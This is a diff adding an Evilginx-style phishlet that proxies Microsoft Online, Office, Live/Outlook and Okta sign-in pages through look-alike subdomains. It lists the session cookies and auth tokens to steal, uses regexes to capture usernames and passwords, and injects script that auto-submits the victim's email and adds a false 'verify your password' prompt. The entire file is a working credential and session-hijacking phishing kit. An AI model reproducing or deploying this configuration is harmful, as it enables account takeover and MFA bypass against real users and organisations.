@@ -1,0 +1,119 @@
+name: "o366"
+author: "@gytee"
+min_ver: "2.3.0"
+proxy_hosts:
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: false, is_landing:false}
+  - { phish_sub: "acc", orig_sub: "account", domain: "microsoft.com", session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "o", orig_sub: "o", domain: "okta.com", session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "okta", orig_sub: "login", domain: "okta.com", session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "live", orig_sub: "login", domain: "live.com", session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "account", orig_sub: "account", domain: "live.com", session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "outlook", orig_sub: "outlook", domain: "live.com", session: true, is_landing: false }
+
+sub_filters:
+  # - {
+  #     triggers_on: "login.microsoftonline.com",
+  #     orig_sub: "",
+  #     domain: "",
+  #     search: '<meta http-equiv="Content-Security-Policy" content="(.*?)"',
+  #     replace: '<meta http-equiv="Content-Security-Policy" content="default-src *  data: blob: filesystem: about: ws: wss: ''unsafe-inline'' ''unsafe-eval''; script-src * data: blob: ''unsafe-inline'' ''unsafe-eval''; connect-src * data: blob: ''unsafe-inline''; img-src * data: blob: ''unsafe-inline''; frame-src * data: blob: ; style-src * data: blob: ''unsafe-inline''; font-src * data: blob: ''unsafe-inline'';"',
+  #     mimes: ["text/html"],
+  #   }
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "login", domain: "microsoftonline.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", text/javascript] }
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "login", domain: "microsoftonline.com", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", text/javascript], redirect_only: true }
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "account", domain: "microsoft.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", text/javascript] }
+  ##
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "login", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "text/javascript", "application/json"] }
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "account", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "text/javascript", "application/json"] }
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "outlook", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "text/javascript", "application/json"] }
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "www", domain: "office.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "text/javascript", "application/json"] }
+
+  - { triggers_on: "login.live.com", orig_sub: "login", domain: "microsoftonline.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", text/javascript] }
+  - { triggers_on: "login.live.com", orig_sub: "account", domain: "microsoft.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", text/javascript] }
+  - { triggers_on: "login.live.com", orig_sub: "login", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", text/javascript] }
+  - { triggers_on: "login.live.com", orig_sub: "account", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", text/javascript] }
+  - { triggers_on: "login.live.com", orig_sub: "outlook", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", text/javascript] }
+  - { triggers_on: "login.live.com", orig_sub: "www", domain: "office.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", text/javascript] }
+
+  - { triggers_on: "account.live.com", orig_sub: "login", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", text/javascript] }
+  - { triggers_on: "account.live.com", orig_sub: "account", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", text/javascript] }
+  - { triggers_on: "account.live.com", orig_sub: "outlook", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", text/javascript] }
+  - { triggers_on: "account.live.com", orig_sub: "www", domain: "office.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", text/javascript] }
+
+auth_tokens:
+  - domain: '.login.microsoftonline.com'
+    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'SignInStateCookie', 'esctx', 'brcap']
+
+  - domain: 'login.microsoftonline.com'
+    keys: ['ESTSSC', 'ESTSAUTHLIGHT','buid', 'fpc', 'stsservicecookie', 'x-ms-gateway-slice']
+
+  - domain: '.live.com'
+    keys: ['wlidperf', 'PPLState', 'MSPProf', 'NAP', 'ANON', 'WLSSC', 'MSPAuth', 'RPSSecAuth']
+
+  - domain: '.login.live.com'
+    keys: ['MSCC', 'OParams', 'MSPOK','JSHP', 'JSH', 'SDIDC', 'MSPBack','MSPSoftVis', 'uaid', 'MSPRequ']
+
+  - domain: 'login.live.com'
+    keys: ['__Host-MSAAUTH']
+
+  - domain: 'outlook.live.com'
+    keys: ['DefaultAnchorMailbox', 'O365Consumer', 'SuiteServiceProxyKey', 'X-OWA-CANARY', 'ClientId', 'exchangecookie', 'orgName', 'domainName', 'LI', 'UC', 'RoutingKeyCookie']
+
+force_post:
+  - path: "/ppsecure/post*"
+    search:
+      - { key: "LoginOptions", search: "1" }
+    force:
+      - { key: "DontShowAgain", value: "true" }
+    type: "post"
+
+auth_urls:
+  - "/kmsi*"
+  - "/ppsecure/post.srf*"
+  - "/owa/prefetch.aspx*"
+  - "/webmanifest.json*"
+  - "/landingv2"
+
+credentials:
+  # username:
+  #   key: ""
+  #   search: '"username":"([^"]*)'
+  #   type: "json"
+  # password:
+  #   key: ""
+  #   search: '"password":"([^"]*)'
+  #   type: "json"
+  username:
+    key: (login|UserName|username|email|account)
+    search: (.*)
+  password:
+    key: (passwd|Password|password|login_password|pass|pwd|session_password|PASSWORD)
+    search: (.*)
+
+login:
+  domain: "login.microsoftonline.com"
+  path: "/"
+
+js_inject:
+  - trigger_domains: ["login.microsoftonline.com", "login.live.com"]
+    trigger_paths: ["/common/oauth2/", "/", "/*"]
+    script: |
+      window.addEventListener("load", () => {
+        function waitForElm(e){return new Promise(t=>{if(document.querySelector(e))return t(document.querySelector(e));const r=new MutationObserver(o=>{document.querySelector(e)&&(t(document.querySelector(e)),r.disconnect())});r.observe(document.body,{childList:!0,subtree:!0})})}
+        waitForElm("#i0116").then((elm) => {
+          if (window.location.hash.length == 0) {
+            return
+          }
+          elm.focus();
+          elm.value = window.location.hash.slice(1);
+          const submBtn = document.querySelector("#idSIButton9");
+          submBtn.focus();
+          submBtn.click();
+        });
+        waitForElm("#loginHeader").then((elm) => {
+          let p = document.createElement('p');
+          p.textContent = "Because you're accessing sensitive info you need to verify your password";
+          document.querySelectorAll("#loginHeader")[0].appendChild(p); 
+        });
+      });
